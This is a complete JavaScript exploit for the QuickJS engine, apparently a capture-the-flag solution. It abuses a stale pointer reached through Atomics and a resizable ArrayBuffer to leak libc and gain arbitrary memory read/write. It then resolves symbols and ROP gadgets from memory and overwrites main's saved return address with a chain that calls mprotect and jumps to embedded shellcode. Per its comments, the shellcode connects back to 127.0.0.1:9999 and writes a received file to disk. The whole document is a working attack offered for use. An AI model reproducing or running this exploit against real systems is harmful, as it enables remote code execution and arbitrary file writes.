'use strict';

// QuickJS Atomics + Resizable ArrayBuffer stale-pointer exploit -> connectback
// Offset-independent: resolves libc base, symbols, gadgets dynamically from in-memory ELF.
// No std/os modules; seccomp blocks process spawning, so we use syscall shellcode.

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }
function align8(n) { return (n + 7) & ~7; }

// -------------------- primitive #1: libc pointer leak --------------------
// Leak from glibc free-chunk metadata written during realloc-split.
// We read the *second* qword in the freed remainder (bk), which is a libc pointer.
function leak_libc_ptr() {
  let rab = new ArrayBuffer(0x3000, { maxByteLength: 0x3000 });

  // Heap shaping: allocate additional large buffers to reduce chance of shrinking into top chunk.
  let consume = new ArrayBuffer(0x18000);
  let after = new ArrayBuffer(0x18000);
  if ((consume.byteLength ^ after.byteLength) === 0xdeadbeef) throw 0;

  let ta = new BigInt64Array(rab);
  let evil = { valueOf() { rab.resize(0x20); return 0n; } };

  // index 7 => offset 0x38, which (after shrink) lands on the bk pointer of the free remainder.
  return u64(Atomics.add(ta, 7, evil));
}

// -------------------- primitive #2: arbitrary read/write via typed-array u.ptr corruption --------------------
// This is the classic prior technique: shrink 0x70->0x20 leaving a 0x50 remainder chunk.
// The subsequent BigUint64Array object creation reuses that chunk and the stale atomic store
// corrupts the typed array's internal data pointer.
function make_arb_u64_view(base_addr, byte_len) {
  byte_len = align8(byte_len);
  let backing = new ArrayBuffer(byte_len);
  let victim = null;

  let rab = new ArrayBuffer(0x70, { maxByteLength: 0x70 });
  let ta = new BigInt64Array(rab);

  // Small noise helps stability.
  let noise = [];
  for (let i = 0; i < 16; i++) noise.push(new ArrayBuffer(0x40));

  let evil = {
    valueOf() {
      rab.resize(0x20);
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  // index 13 => offset 0x68 (stale ptr). This overlaps a pointer field that drives the victim view.
  Atomics.store(ta, 13, evil);
  if (victim === null) throw new Error('arb view failed');
  return { backing, victim, base: base_addr };
}

function read_u64(view, addr) {
  let idx = Number((addr - view.base) >> 3n);
  return u64(view.victim[idx]);
}
function read_u32(view, addr) {
  let a = addr & ~7n;
  let w = read_u64(view, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffffffffn);
}
function read_u16(view, addr) {
  let a = addr & ~7n;
  let w = read_u64(view, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffffn);
}
function read_u8(view, addr) {
  let a = addr & ~7n;
  let w = read_u64(view, a);
  let sh = Number((addr - a) * 8n);
  return Number((w >> BigInt(sh)) & 0xffn);
}
function read_cstring(view, addr, maxLen) {
  let s = '';
  for (let i = 0; i < maxLen; i++) {
    let c = read_u8(view, addr + BigInt(i));
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

// -------------------- libc base discovery --------------------
function find_libc_base_from_ptr(leak) {
  // Scan downwards for an ELF header.
  const scan = 0x800000; // 8MB
  let leak_page = leak & ~0xfffn;
  let start = leak_page - BigInt(scan);

  let mem = make_arb_u64_view(start & ~7n, scan + 0x2000);
  for (let off = scan; off >= 0; off -= 0x1000) {
    let w = mem.victim[off >> 3];
    if ((w & 0xffffffffn) === 0x464c457fn)
      return (start + BigInt(off)) & ~0xfffn;
  }
  return 0n;
}

// -------------------- ELF parsing and dynsym lookup --------------------
function parse_elf64_phdrs(base) {
  let v = make_arb_u64_view(base, 0x4000);
  let phoff = read_u64(v, base + 0x20n);
  let phentsz = read_u16(v, base + 0x36n);
  let phnum = read_u16(v, base + 0x38n);

  const PT_LOAD = 1;
  const PT_DYNAMIC = 2;
  const PF_X = 1;

  let text = null;
  let dyn = null;

  for (let i = 0; i < phnum; i++) {
    let p = base + phoff + BigInt(i * phentsz);
    let p_type = read_u32(v, p + 0n);
    let p_flags = read_u32(v, p + 4n);
    let p_vaddr = read_u64(v, p + 0x10n);
    let p_memsz = read_u64(v, p + 0x28n);

    if (p_type === PT_LOAD && (p_flags & PF_X))
      text = { vaddr: p_vaddr, memsz: p_memsz };
    if (p_type === PT_DYNAMIC)
      dyn = { vaddr: p_vaddr, memsz: p_memsz };
  }
  if (!text || !dyn) throw new Error('ELF parse failed');

  return {
    textStart: base + text.vaddr,
    textEnd: base + text.vaddr + text.memsz,
    dynAddr: base + dyn.vaddr,
    dynSize: dyn.memsz,
  };
}

function parse_dynamic(dynAddr, dynSize) {
  let v = make_arb_u64_view(dynAddr & ~7n, align8(Number(dynSize + 0x1000n)));

  const DT_NULL = 0n;
  const DT_HASH = 4n;
  const DT_STRTAB = 5n;
  const DT_SYMTAB = 6n;
  const DT_STRSZ = 10n;
  const DT_SYMENT = 11n;

  let symtab = 0n, strtab = 0n, strsz = 0n, syment = 0n, hash = 0n;

  for (let off = 0n; off < dynSize; off += 16n) {
    let tag = read_u64(v, dynAddr + off);
    let val = read_u64(v, dynAddr + off + 8n);
    if (tag === DT_NULL) break;
    if (tag === DT_SYMTAB) symtab = val;
    if (tag === DT_STRTAB) strtab = val;
    if (tag === DT_STRSZ) strsz = val;
    if (tag === DT_SYMENT) syment = val;
    if (tag === DT_HASH) hash = val;
  }
  if (!symtab || !strtab || !strsz || !syment) throw new Error('dyn parse failed');

  let nsyms = 0;
  if (hash !== 0n) {
    // SysV hash header: nbucket, nchain
    let h = make_arb_u64_view(hash & ~7n, 0x1000);
    nsyms = read_u32(h, hash + 4n);
  } else if (strtab > symtab) {
    nsyms = Number((strtab - symtab) / syment);
  } else {
    nsyms = 32768;
  }

  return { symtab, strtab, strsz, syment, nsyms };
}

function lookup_sym(libcBase, dyn, name) {
  let start = dyn.symtab & ~7n;
  let end = dyn.strtab + dyn.strsz;
  let v = make_arb_u64_view(start, align8(Number(end - start + 0x2000n)));

  for (let i = 0; i < dyn.nsyms; i++) {
    let sym = dyn.symtab + BigInt(i) * dyn.syment;
    let st_name = read_u32(v, sym + 0n);
    if (st_name === 0) continue;

    if (read_u8(v, dyn.strtab + BigInt(st_name)) !== name.charCodeAt(0))
      continue;

    let s = read_cstring(v, dyn.strtab + BigInt(st_name), 256);
    if (s === name) {
      let st_value = read_u64(v, sym + 8n);
      return libcBase + st_value;
    }
  }
  return 0n;
}

// -------------------- gadget scanning --------------------
function find_gadget(view, start, end, bytes) {
  let patLen = bytes.length;
  let pat = 0n;
  for (let i = 0; i < patLen; i++) pat |= BigInt(bytes[i]) << BigInt(i * 8);
  let mask = (1n << BigInt(patLen * 8)) - 1n;

  let s = start;
  let e = end - BigInt(patLen);

  let first = Number((s - view.base) >> 3n);
  let last = Number((e - view.base) >> 3n);
  if (first < 0) first = 0;
  let n = view.victim.length;
  if (last > n - 2) last = n - 2;

  for (let i = first; i <= last; i++) {
    let w0 = u64(view.victim[i]);
    let w1 = u64(view.victim[i + 1]);
    let combo = w0 | (w1 << 64n);
    for (let pos = 0; pos < 8; pos++) {
      let v = (combo >> BigInt(pos * 8)) & mask;
      if (v === pat) {
        let addr = view.base + BigInt(i * 8 + pos);
        if (addr >= start && addr <= e) return addr;
      }
    }
  }
  return 0n;
}

function find_pop_rdx(view, start, end) {
  let a = find_gadget(view, start, end, [0x5a, 0xc3]);
  if (a) return { addr: a, extra: 0 };
  a = find_gadget(view, start, end, [0x5a, 0x5b, 0xc3]);
  if (a) return { addr: a, extra: 1 };
  a = find_gadget(view, start, end, [0x5a, 0x41, 0x5c, 0xc3]);
  if (a) return { addr: a, extra: 1 };
  return { addr: 0n, extra: 0 };
}

// -------------------- stack return-slot discovery --------------------
function is_call_reg_ret(textView, addr) {
  // call *reg is: ff d0..d7 (optionally preceded by REX 4?)
  let b1 = read_u8(textView, addr - 2n);
  let b2 = read_u8(textView, addr - 1n);
  if (b1 === 0xff && (b2 & 0xf8) === 0xd0) return true;
  let b0 = read_u8(textView, addr - 3n);
  if ((b0 & 0xf0) === 0x40 && b1 === 0xff && (b2 & 0xf8) === 0xd0) return true;
  return false;
}

function find_main_ret_slot(stackView, textView, textStart, textEnd) {
  let n = stackView.victim.length;
  for (let i = n - 1; i >= 0; i--) {
    let v = u64(stackView.victim[i]);
    if (v >= textStart && v < textEnd) {
      if (is_call_reg_ret(textView, v)) return i;
    }
  }
  return -1;
}

// -------------------- shellcode (x86_64 Linux) --------------------
// connect(127.0.0.1:9999), receive <u32 fnlen><fn><u32 clen><content>, write file.
const SC_HEX = 'b829000000bf02000000be0100000031d20f054989c44883ec2066c70424020066c7442402270fc74424047f00000131c04889442408b82a0000004489e7488d3424ba100000000f054489e7488d742410ba04000000e89c0000008b5c24104881ec000400004989e54489e74c89ee89dae88100000041c6441d00004489e7498db500010000ba04000000e867000000458bbd00010000b801010000bf9cffffff4c89eeba4102000041baa40100000f054989c64489e7498db5200100004489fae831000000b8010000004489f7498db5200100004489fa0f05b8030000004489f70f05b8030000004489e70f05b83c00000031ff0f0531c04885d274120f054883f8007e0a4801c64829c231c0ebe9c3';

function hex_to_bytes(hex) {
  let out = [];
  for (let i = 0; i < hex.length; i += 2)
    out.push(parseInt(hex.slice(i, i + 2), 16));
  return out;
}

function write_shellcode(dstPage, dstAddr) {
  let bytes = hex_to_bytes(SC_HEX);
  let view = make_arb_u64_view(dstPage, 0x2000);
  let baseIdx = Number((dstAddr - dstPage) >> 3n);

  for (let i = 0; i < bytes.length; i += 8) {
    let w = 0n;
    for (let j = 0; j < 8 && (i + j) < bytes.length; j++)
      w |= BigInt(bytes[i + j]) << BigInt(j * 8);
    view.victim[baseIdx + (i >> 3)] = u64(w);
  }
}

function pwn() {
  let leak = leak_libc_ptr();
  let libcBase = find_libc_base_from_ptr(leak);
  if (libcBase === 0n) return;

  let ph = parse_elf64_phdrs(libcBase);
  let dyn = parse_dynamic(ph.dynAddr, ph.dynSize);

  let mprotect = lookup_sym(libcBase, dyn, 'mprotect');
  let environ = lookup_sym(libcBase, dyn, 'environ');
  if (!mprotect || !environ) return;

  // environ -> envp -> env0 (points into env strings region on initial stack)
  let envView = make_arb_u64_view(environ & ~7n, 0x100);
  let envp = read_u64(envView, environ);
  let envpView = make_arb_u64_view(envp & ~7n, 0x1000);
  let env0 = read_u64(envpView, envp);

  // Shellcode destination: environment strings page on stack
  let sc_page = env0 & ~0xfffn;
  let sc_addr = sc_page + 0x800n;

  // Build libc text view for gadget search
  let textBase = ph.textStart & ~7n;
  let textLen = align8(Number(ph.textEnd - textBase));
  let textView = make_arb_u64_view(textBase, textLen + 0x100);

  let pop_rdi = find_gadget(textView, ph.textStart, ph.textEnd, [0x5f, 0xc3]);
  let pop_rsi = find_gadget(textView, ph.textStart, ph.textEnd, [0x5e, 0xc3]);
  let pop_rdx = find_pop_rdx(textView, ph.textStart, ph.textEnd);
  let ret = find_gadget(textView, ph.textStart, ph.textEnd, [0xc3]);
  if (!pop_rdi || !pop_rsi || !pop_rdx.addr || !ret) return;

  // Map a modest stack window below envp and find main's saved RIP
  const stackScan = 0x80000; // 512KB
  let stackBase = (envp - BigInt(stackScan)) & ~7n;
  let stackView = make_arb_u64_view(stackBase, stackScan);
  let ret_i = find_main_ret_slot(stackView, textView, ph.textStart, ph.textEnd);
  if (ret_i < 0) return;

  // Write shellcode
  write_shellcode(sc_page, sc_addr);

  // Install ROP chain: mprotect(sc_page, 0x1000, 7); jmp sc_addr
  let chain = [
    ret,
    pop_rdi, sc_page,
    pop_rsi, 0x1000n,
    pop_rdx.addr, 7n,
  ];
  for (let i = 0; i < pop_rdx.extra; i++) chain.push(0n);
  chain.push(mprotect);
  chain.push(sc_addr);

  for (let j = 0; j < chain.length; j++) {
    stackView.victim[ret_i + j] = u64(chain[j]);
  }
}

pwn();
